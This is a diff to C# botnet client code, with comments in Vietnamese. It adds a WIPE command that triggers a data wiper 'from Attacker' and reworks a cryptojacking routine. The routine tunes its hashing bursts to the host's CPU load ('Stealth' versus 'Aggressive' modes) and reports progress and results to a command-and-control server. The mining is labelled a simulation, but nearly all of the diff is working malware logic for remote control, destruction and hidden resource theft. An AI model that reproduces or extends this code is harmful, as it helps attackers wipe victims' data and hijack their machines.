@@ -266,28 +266,45 @@ public class Bot
 
     static async Task ExecuteCommand(string command)
     {
+        // Nếu đang wipe thì không nhận lệnh khác
+        if (currentStatus == "WIPING") return;
+
         switch (command)
         {
+            case BotCommands.Wipe:
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[CMD] Received WIPE command.");
+                TriggerWiper("Command from Attacker");
+                break;
+
             case BotCommands.Cryptojack:
+                // Chỉ bắt đầu nếu chưa chạy
                 if (currentStatus != BotCommands.Cryptojack)
                 {
-                    StopCurrentTask();
+                    StopCurrentTask(); // Dừng cái cũ trước
                     currentStatus = BotCommands.Cryptojack;
-                    Console.WriteLine("Executing cryptojacking simulation...");
 
+                    // Tạo token mới
                     _taskCancellationTokenSource = new CancellationTokenSource();
-                    // Chạy và chờ tác vụ hoàn thành (hoặc bị hủy)
-                    await SimulateCryptoJack(_taskCancellationTokenSource.Token);
+
+                    // Chạy task đào coin (không await để nó chạy nền, tránh block vòng lặp chính)
+                    _ = SimulateCryptoJack(_taskCancellationTokenSource.Token);
                 }
                 break;
 
             case BotCommands.Idle:
             default:
+                // Luôn dừng tác vụ nếu nhận lệnh idle
+                StopCurrentTask();
+
                 if (currentStatus != BotCommands.Idle)
                 {
-                    StopCurrentTask();
                     currentStatus = BotCommands.Idle;
-                    Console.WriteLine("Switching to idle state.");
+                    Console.WriteLine("State changed to IDLE. CPU should drop now.");
+
+                    // Ép dọn dẹp bộ nhớ để Task Manager giảm RAM ngay
+                    GC.Collect();
+                    GC.WaitForPendingFinalizers();
                 }
                 break;
         }
@@ -296,12 +313,22 @@ public class Bot
     // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
     static void StopCurrentTask()
     {
-        if (_taskCancellationTokenSource != null && !_taskCancellationTokenSource.IsCancellationRequested)
+        if (_taskCancellationTokenSource != null)
         {
-            Console.WriteLine("Stopping current task...");
-            _taskCancellationTokenSource.Cancel();
-            _taskCancellationTokenSource.Dispose();
-            _taskCancellationTokenSource = null;
+            try
+            {
+                Console.WriteLine("Stopping background tasks...");
+                _taskCancellationTokenSource.Cancel(); // Gửi tín hiệu dừng
+                _taskCancellationTokenSource.Dispose(); // Giải phóng resource
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error stopping task: {ex.Message}");
+            }
+            finally
+            {
+                _taskCancellationTokenSource = null;
+            }
         }
     }
     //static async Task SendResultToServerAsync(long nonce, string hash)
@@ -356,102 +383,205 @@ public class Bot
         catch { }
     }
 
+    //static Task SimulateCryptoJack(CancellationToken cancellationToken)
+    //{
+    //    return Task.Run(async () =>
+    //    {
+    //        // Biến này sẽ được chia sẻ giữa bộ cảm biến và vòng lặp chính
+    //        int adaptiveHashesPerBurst = 10000; // Mặc định ở mức cân bằng
+
+    //        var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+    //        cpuCounter.NextValue();
+
+    //        _ = Task.Run(async () =>
+    //        {
+    //            while (!cancellationToken.IsCancellationRequested)
+    //            {
+    //                float totalSystemCpuUsage = cpuCounter.NextValue();
+
+    //                // === LOGIC THÍCH ỨNG MỚI ===
+    //                if (totalSystemCpuUsage > 40.0f)
+    //                {
+    //                    // HỆ THỐNG BẬN -> LÀM VIỆC VỚI LÔ LỚN
+    //                    adaptiveHashesPerBurst = 100000;
+    //                    Console.WriteLine($"[ADAPTIVE] System CPU HIGH -> Aggressive Mode (Burst: {adaptiveHashesPerBurst})");
+    //                }
+    //                else
+    //                {
+    //                    // HỆ THỐNG RẢNH -> LÀM VIỆC VỚI LÔ NHỎ
+    //                    adaptiveHashesPerBurst = 10000; // Tính 500 hash trước khi nghỉ
+    //                    Console.WriteLine($"[ADAPTIVE] System CPU LOW -> Stealth Mode (Burst: {adaptiveHashesPerBurst})");
+    //                }
+    //                await Task.Delay(3000, cancellationToken);
+    //            }
+    //        }, cancellationToken);
+
+    //        // === LOGIC ĐÀO LIÊN TỤC & LÀM VIỆC THEO LÔ ===
+    //        try
+    //        {
+    //            using (SHA256 sha256 = SHA256.Create())
+    //            {
+    //                int taskNumber = 1;
+    //                await SendLogToServerAsync("Starting PERSISTENT & ADAPTIVE mining task (Batch-based)...");
+
+    //                while (!cancellationToken.IsCancellationRequested)
+    //                {
+    //                    long nonce = 0;
+    //                    int burstCounter = 0;
+    //                    string mode = adaptiveHashesPerBurst > 50000 ? "AGGRESSIVE" : "STEALTH";
+    //                    await SendLogToServerAsync($"[TASK #{taskNumber}] Starting search... Mode: {mode}");
+
+    //                    while (!cancellationToken.IsCancellationRequested)
+    //                    {
+    //                        // === PHẦN BỊ THIẾU TRƯỚC ĐÂY ===
+    //                        // 1. Dữ liệu để hash
+    //                        string dataToHash = $"BalancedTask-{taskNumber}-{nonce}";
+    //                        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
+
+    //                        // 2. Chuyển đổi byte array thành chuỗi hex và khai báo 'hashString'
+    //                        var sBuilder = new StringBuilder();
+    //                        for (int i = 0; i < bytes.Length; i++) { sBuilder.Append(bytes[i].ToString("x2")); }
+    //                        string hashString = sBuilder.ToString();
+    //                        // ===================================
+
+    //                        // Bây giờ, 'hashString' đã tồn tại và có thể sử dụng được
+    //                        if (hashString.StartsWith("000000"))
+    //                        {
+    //                            await SendLogToServerAsync($"!!! [TASK #{taskNumber}] Hash FOUND! Nonce: {nonce}");
+    //                            await SendResultToServerAsync(nonce, hashString);
+    //                            taskNumber++;
+    //                            break;
+    //                        }
+    //                        nonce++;
+    //                        burstCounter++;
+
+    //                        if (burstCounter >= adaptiveHashesPerBurst)
+    //                        {
+    //                            await Task.Delay(20, cancellationToken);
+    //                            burstCounter = 0;
+    //                        }
+    //                    }
+    //                }
+    //            }
+    //        }
+    //        catch (OperationCanceledException)
+    //        {
+    //            // Chỉ log khi tác vụ bị hủy bởi lệnh từ server
+    //            Console.WriteLine("Persistent mining task was canceled by C&C server.");
+    //        }
+    //        catch (Exception ex)
+    //        {
+    //            Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
+    //        }
+    //        finally
+    //        {
+    //            // Chỉ khi tác vụ bị hủy thì bot mới quay về idle
+    //            currentStatus = BotCommands.Idle;
+    //            Console.WriteLine("Task stopped. Returning to idle.");
+    //        }
+    //    }, cancellationToken);
+    //}
     static Task SimulateCryptoJack(CancellationToken cancellationToken)
     {
         return Task.Run(async () =>
         {
-            // Biến này sẽ được chia sẻ giữa bộ cảm biến và vòng lặp chính
-            int adaptiveHashesPerBurst = 10000; // Mặc định ở mức cân bằng
+            int adaptiveHashesPerBurst = 10000;
 
-            var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-            cpuCounter.NextValue();
-
-            _ = Task.Run(async () =>
+            // === QUAN TRỌNG: Bọc PerformanceCounter trong using để tự động hủy khi xong ===
+            using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
             {
-                while (!cancellationToken.IsCancellationRequested)
+                try
                 {
-                    float totalSystemCpuUsage = cpuCounter.NextValue();
-
-                    // === LOGIC THÍCH ỨNG MỚI ===
-                    if (totalSystemCpuUsage > 40.0f)
-                    {
-                        // HỆ THỐNG BẬN -> LÀM VIỆC VỚI LÔ LỚN
-                        adaptiveHashesPerBurst = 100000;
-                        Console.WriteLine($"[ADAPTIVE] System CPU HIGH -> Aggressive Mode (Burst: {adaptiveHashesPerBurst})");
-                    }
-                    else
-                    {
-                        // HỆ THỐNG RẢNH -> LÀM VIỆC VỚI LÔ NHỎ
-                        adaptiveHashesPerBurst = 10000; // Tính 500 hash trước khi nghỉ
-                        Console.WriteLine($"[ADAPTIVE] System CPU LOW -> Stealth Mode (Burst: {adaptiveHashesPerBurst})");
-                    }
-                    await Task.Delay(3000, cancellationToken);
+                    cpuCounter.NextValue(); // Lần gọi đầu luôn trả về 0
                 }
-            }, cancellationToken);
+                catch { }
 
-            // === LOGIC ĐÀO LIÊN TỤC & LÀM VIỆC THEO LÔ ===
-            try
-            {
-                using (SHA256 sha256 = SHA256.Create())
+                // Thread phụ theo dõi CPU (Cũng phải check token để dừng)
+                _ = Task.Run(async () =>
                 {
-                    int taskNumber = 1;
-                    await SendLogToServerAsync("Starting PERSISTENT & ADAPTIVE mining task (Batch-based)...");
-
                     while (!cancellationToken.IsCancellationRequested)
                     {
-                        long nonce = 0;
-                        int burstCounter = 0;
-                        string mode = adaptiveHashesPerBurst > 50000 ? "AGGRESSIVE" : "STEALTH";
-                        await SendLogToServerAsync($"[TASK #{taskNumber}] Starting search... Mode: {mode}");
+                        try
+                        {
+                            float totalSystemCpuUsage = cpuCounter.NextValue();
+                            if (totalSystemCpuUsage > 50.0f)
+                            {
+                                adaptiveHashesPerBurst = 100000; // Máy bận -> Đào mạnh (hoặc giảm tùy chiến thuật)
+                            }
+                            else
+                            {
+                                adaptiveHashesPerBurst = 10000;
+                            }
+                        }
+                        catch { }
 
+                        // Chờ 3s, nhưng nếu bị hủy thì thoát ngay
+                        try { await Task.Delay(3000, cancellationToken); } catch { break; }
+                    }
+                }, cancellationToken);
+
+                // Thread chính đào coin
+                try
+                {
+                    using (SHA256 sha256 = SHA256.Create())
+                    {
+                        await SendLogToServerAsync("Mining started [CPU Intensive Mode].");
+
+                        long nonce = 0;
+
+                        // Vòng lặp chính: Check token liên tục
                         while (!cancellationToken.IsCancellationRequested)
                         {
-                            // === PHẦN BỊ THIẾU TRƯỚC ĐÂY ===
-                            // 1. Dữ liệu để hash
-                            string dataToHash = $"BalancedTask-{taskNumber}-{nonce}";
-                            byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
+                            int burstCounter = 0;
 
-                            // 2. Chuyển đổi byte array thành chuỗi hex và khai báo 'hashString'
-                            var sBuilder = new StringBuilder();
-                            for (int i = 0; i < bytes.Length; i++) { sBuilder.Append(bytes[i].ToString("x2")); }
-                            string hashString = sBuilder.ToString();
-                            // ===================================
-
-                            // Bây giờ, 'hashString' đã tồn tại và có thể sử dụng được
-                            if (hashString.StartsWith("000000"))
+                            // Vòng lặp nhỏ (Burst): Đào một cục rồi nghỉ
+                            while (!cancellationToken.IsCancellationRequested)
                             {
-                                await SendLogToServerAsync($"!!! [TASK #{taskNumber}] Hash FOUND! Nonce: {nonce}");
-                                await SendResultToServerAsync(nonce, hashString);
-                                taskNumber++;
-                                break;
-                            }
-                            nonce++;
-                            burstCounter++;
+                                string dataToHash = $"MiningBlock-{nonce}";
+                                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
 
-                            if (burstCounter >= adaptiveHashesPerBurst)
-                            {
-                                await Task.Delay(20, cancellationToken);
-                                burstCounter = 0;
+                                // Giả lập tìm hash (Độ khó thấp để test)
+                                if (bytes[0] == 0 && bytes[1] == 0 && bytes[2] == 0)
+                                {
+                                    string hashString = BitConverter.ToString(bytes).Replace("-", "").ToLower();
+                                    // Fire and forget log để không chặn luồng đào
+                                    _ = SendLogToServerAsync($"Hash FOUND! Nonce: {nonce}");
+                                    _ = SendResultToServerAsync(nonce, hashString);
+
+                                    // Nghỉ nhẹ để CPU thở
+                                    await Task.Delay(10);
+                                }
+
+                                nonce++;
+                                burstCounter++;
+
+                                // Hết một đợt Burst -> Nghỉ để check Cancellation Token
+                                if (burstCounter >= adaptiveHashesPerBurst)
+                                {
+                                    // Nghỉ 10ms để hệ điều hành điều phối lại CPU
+                                    // Đây là điểm quan trọng để CPU không bị kẹt ở 100%
+                                    await Task.Delay(10, cancellationToken);
+                                    burstCounter = 0;
+                                }
                             }
                         }
                     }
                 }
-            }
-            catch (OperationCanceledException)
-            {
-                // Chỉ log khi tác vụ bị hủy bởi lệnh từ server
-                Console.WriteLine("Persistent mining task was canceled by C&C server.");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
-            }
-            finally
-            {
-                // Chỉ khi tác vụ bị hủy thì bot mới quay về idle
-                currentStatus = BotCommands.Idle;
-                Console.WriteLine("Task stopped. Returning to idle.");
-            }
+                catch (OperationCanceledException)
+                {
+                    Console.WriteLine("Mining task stopped by user.");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Mining Error: {ex.Message}");
+                }
+                finally
+                {
+                    // Đảm bảo trạng thái về Idle khi thoát
+                    currentStatus = BotCommands.Idle;
+                    await SendLogToServerAsync("Mining stopped. CPU releasing...");
+                }
+            } // Kết thúc using (cpuCounter) -> Giải phóng bộ đếm CPU
         }, cancellationToken);
     }
 }
